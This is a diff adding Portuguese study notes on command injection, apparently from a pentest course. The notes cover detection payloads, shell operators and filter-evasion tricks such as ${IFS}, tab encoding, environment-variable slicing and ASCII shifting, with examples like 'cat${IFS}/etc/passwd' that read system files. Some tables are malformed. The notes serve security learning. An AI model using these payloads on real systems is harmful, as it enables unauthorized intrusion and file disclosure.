@@ -197,3 +197,456 @@ req.query.filename
 vem diretamente da URL e é inserido no comando sem validação.
 
 ---
+
+# 💥 EXPLORAÇÃO
+
+# 🔍 Detecção
+
+A detecção de **Command Injection** é semelhante a outros tipos de injeção.
+
+A ideia principal é:
+
+1. enviar um input controlado;
+2. observar a resposta da aplicação;
+3. identificar mudanças de comportamento.
+
+---
+
+## 🧪 Como funciona?
+
+O payload normalmente é construído gradualmente.
+
+Exemplo:
+
+```text
+teste
+teste;id
+teste&&whoami
+```
+
+O atacante adiciona pequenos operadores até confirmar que comandos estão sendo executados.
+
+---
+
+# 🛠️ Métodos de Injeção
+
+Os operadores abaixo permitem adicionar comandos extras ao comando original da aplicação.
+
+| Operador | URL Encode  | Funcionamento                                     |                                                      |                                                |
+| -------- | ----------- | ------------------------------------------------- | ---------------------------------------------------- | ---------------------------------------------- |
+| `;`      | `%3b`       | Executa ambos os comandos                         |                                                      |                                                |
+| `\n`     | `%0a`       | Executa ambos                                     |                                                      |                                                |
+| `&`      | `%26`       | Executa ambos                                     |                                                      |                                                |
+| `        | `           | `%7c`                                             | Executa ambos, mas geralmente exibe apenas o segundo |                                                |
+| `&&`     | `%26%26`    | Executa o segundo somente se o primeiro funcionar |                                                      |                                                |
+| `        |             | `                                                 | `%7c%7c`                                             | Executa o segundo somente se o primeiro falhar |
+| ` ` ``   | `%60%60`    | Executa comando dentro das crases (Linux)         |                                                      |                                                |
+| `$()`    | `%24%28%29` | Substituição de comando (Linux)                   |                                                      |                                                |
+
+---
+
+## ⚠️ Observações
+
+### `;`
+
+Não funciona no ambiente **CMD do Windows**.
+
+---
+
+## 🧩 Estrutura do Payload
+
+Geralmente utilizamos:
+
+```text
+input esperado + operador + payload
+```
+
+Exemplo:
+
+```text
+127.0.0.1;whoami
+```
+
+---
+
+# 🌐 Validações no Frontend
+
+## 🔎 Como identificar?
+
+Uma validação feita apenas no frontend normalmente:
+
+* NÃO gera nova requisição;
+* ocorre apenas no navegador;
+* pode ser facilmente burlada.
+
+---
+
+## ⚠️ Problema
+
+Em alguns casos:
+
+* o frontend valida;
+* mas o backend NÃO sanitiza nada.
+
+Isso cria uma falsa sensação de segurança.
+
+---
+
+## 🛠️ Como burlar?
+
+Ferramentas comuns:
+
+* Burp Suite
+* Caido
+
+Essas ferramentas permitem:
+
+* interceptar requests;
+* modificar parâmetros;
+* reenviar payloads maliciosos.
+
+---
+
+# 🛡️ Evasão de Filtros
+
+# 🔥 Identificando WAFs
+
+## O que é um WAF?
+
+WAF = **Web Application Firewall**
+
+Ele tenta bloquear payloads maliciosos antes que cheguem na aplicação.
+
+---
+
+## 🧠 Como identificar?
+
+Um possível indicativo:
+
+* a mensagem de erro aparece em uma página diferente;
+* pode conter:
+
+  * IP;
+  * request;
+  * identificadores de bloqueio.
+
+---
+
+# 🚫 Blacklist
+
+Algumas aplicações usam listas de caracteres proibidos.
+
+Exemplo:
+
+```php
+$blacklist = ['&', '|', ';', ...SNIP...];
+
+foreach ($blacklist as $character) {
+    if (strpos($_POST['ip'], $character) !== false) {
+        echo "Invalid input";
+    }
+}
+```
+
+---
+
+## 🔍 Como descobrir a blacklist?
+
+Enviar apenas UM caractere por vez:
+
+```text
+;
+&
+|
+$
+```
+
+E observar:
+
+* quais retornam erro;
+* quais passam normalmente.
+
+---
+
+# 🧠 Bypass de Blacklist
+
+## 📚 Referência útil
+
+[PayloadsAllTheThings — Command Injection Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection?utm_source=chatgpt.com#bypass-without-space)
+
+---
+
+## 💡 Conceito importante
+
+Ao entender o fundamento do bypass:
+
+* fica muito mais fácil pesquisar novas técnicas;
+* adaptar payloads;
+* criar evasões próprias.
+
+---
+
+# ↩️ Bypass com Nova Linha (`\n`)
+
+Algumas aplicações NÃO bloqueiam:
+
+```text
+\n
+```
+
+Porque esse caractere pode ser utilizado internamente pela própria aplicação.
+
+---
+
+## ✅ Vantagem
+
+Funciona tanto em:
+
+* Linux
+* Windows
+
+---
+
+# ␠ Bypass de Espaço
+
+## ❓ Por que espaço é bloqueado?
+
+Muitos inputs não esperam espaços.
+
+Exemplo:
+
+```text
+IP
+nome de arquivo
+hostname
+```
+
+Então filtros frequentemente bloqueiam `" "`.
+
+---
+
+# 🧩 Técnicas de Bypass de Espaço
+
+## 1. TAB (`%09`)
+
+Substitui o espaço usando tabulação.
+
+```text
+cat%09/etc/passwd
+```
+
+---
+
+## 2. `${IFS}` (Linux)
+
+`IFS` = Internal Field Separator
+
+Por padrão contém espaço.
+
+Exemplo:
+
+```bash
+cat${IFS}/etc/passwd
+```
+
+---
+
+## 3. Bash Brace Expansion
+
+```bash
+{ls,-la}
+```
+
+O Bash interpreta isso como:
+
+```bash
+ls -la
+```
+
+---
+
+# 🔪 Bypass de Barra, Ponto e Vírgula (`/ ; \`)
+
+## 🧠 Ideia
+
+Utilizar variáveis de ambiente para recuperar caracteres específicos.
+
+---
+
+# 🌍 Variáveis de Ambiente Linux
+
+Exemplos:
+
+```bash
+PATH
+HOME
+PWD
+LS_COLORS
+```
+
+---
+
+## Exemplo
+
+```bash
+echo ${PATH}
+```
+
+Essas variáveis possuem muitos caracteres úteis.
+
+---
+
+# 📌 Manipulando como Array
+
+## Recuperando `/`
+
+```bash
+${PATH:0:1}
+```
+
+### Explicação
+
+* começa na posição `0`;
+* pega `1` caractere.
+
+Resultado:
+
+```text
+/
+```
+
+---
+
+## Recuperando `;`
+
+```bash
+${LS_COLORS:10:1}
+```
+
+---
+
+# 🪟 Windows
+
+O mesmo conceito funciona usando variáveis do Windows.
+
+---
+
+## CMD
+
+### Exemplo
+
+```cmd
+%HOMEPATH%
+```
+
+Resultado:
+
+```text
+\Users\htb-student
+```
+
+---
+
+## Recuperando `\`
+
+```cmd
+echo %HOMEPATH:~6,-11%
+```
+
+---
+
+## Explicação
+
+* começa na posição `6`;
+* remove `11` caracteres do final.
+
+Resultado:
+
+```text
+\
+```
+
+---
+
+# 🔵 PowerShell
+
+## Recuperando caracteres
+
+```powershell
+$env:HOMEPATH[0]
+```
+
+---
+
+## Listando variáveis de ambiente
+
+```powershell
+Get-ChildItem Env:
+```
+
+---
+
+# 🔄 Shifting Characters
+
+## 🧠 Conceito
+
+Essa técnica usa a tabela ASCII.
+
+Passos:
+
+1. encontrar o caractere desejado;
+2. pegar o caractere anterior;
+3. deslocar o valor em +1.
+
+---
+
+## Exemplo
+
+### Caractere desejado
+
+```text
+\ = ASCII 92
+```
+
+### Caractere anterior
+
+```text
+[ = ASCII 91
+```
+
+---
+
+## Payload
+
+```bash
+echo $(tr '!-}' '"-~'<<<[)
+```
+
+---
+
+## 🔍 O que acontece?
+
+O comando `tr` desloca os caracteres em +1.
+
+Resultado final:
+
+```text
+\
+```
+
+---
+
+# 📌 Resumo Rápido
+
+| Técnica               | Objetivo                        |                    |
+| --------------------- | ------------------------------- | ------------------ |
+| `;`, `&&`, `          | `                               | Adicionar comandos |
+| `%0a`                 | Usar nova linha                 |                    |
+| `${IFS}`              | Substituir espaço               |                    |
+| `%09`                 | TAB no lugar de espaço          |                    |
+| Brace Expansion       | Criar espaço automaticamente    |                    |
+| Variáveis de ambiente | Recuperar caracteres bloqueados |                    |
+| ASCII Shifting        | Gerar caracteres proibidos      |                    |
+| Burp/Caido            | Burlar validações frontend      |                    |
+
+---
